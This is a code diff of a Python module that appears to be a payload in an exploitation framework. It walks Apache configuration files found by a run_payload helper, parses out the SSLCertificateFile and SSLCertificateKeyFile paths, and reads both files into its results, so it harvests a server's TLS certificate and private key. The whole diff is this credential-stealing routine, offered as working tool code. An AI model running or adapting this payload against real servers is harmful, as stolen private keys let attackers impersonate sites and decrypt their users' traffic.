@@ -5,31 +5,25 @@ import re
 
 result = []
 
-def parse_config (apache_config):
-    config = re.findall('^(?!\t#)(.*?)$', apache_config, re.MULTILINE)
-    if config:
-        return config
-    else:
-        return ''
-
 def parse_ssl_cert (apache_config):
-    cert = re.search('(?<=SSLCertificateFile    )(.*?)\'', apache_config)
+    cert = re.search('(?<=SSLCertificateFile)(?! directive)    (.*)', apache_config)
     if cert:
         return cert.group(1)
     else:
         return ''
 
 def parse_ssl_key (apache_config):
-    key = re.search('(?<=SSLCertificateKeyFile )(.*?)\'', apache_config)
+    #key = re.search('(?<=SSLCertificateKeyFile )(.*?)\'', apache_config)
+    key = re.search('(?<=SSLCertificateKeyFile )(.*)', apache_config)
     if key:
         return key.group(1)
     else:
         return ''
 
-#TODO:CALLS APACHE_CONFIG_DIRECTORY
-#TODO:CALLS APACHE_CONFIG
-#TODO:BRUTEFORCE DEFAULT KNOWN LOCATIONS
-apache_dir = run_payload('apache_config_directory')
-apache_config = parse_config(read(apache_dir+'sites-available/default-ssl'))
-result.append(read(parse_ssl_cert(str(apache_config))))
-result.append(read(parse_ssl_key(str(apache_config))))
+
+apache_files = run_payload('apache_config_files')
+for file in apache_files:
+    if parse_ssl_cert(read(file)) != '':
+        result.append(read(parse_ssl_cert(read(file))))
+    if parse_ssl_key(read(file)) != '':
+        result.append(read(parse_ssl_key(read(file))))
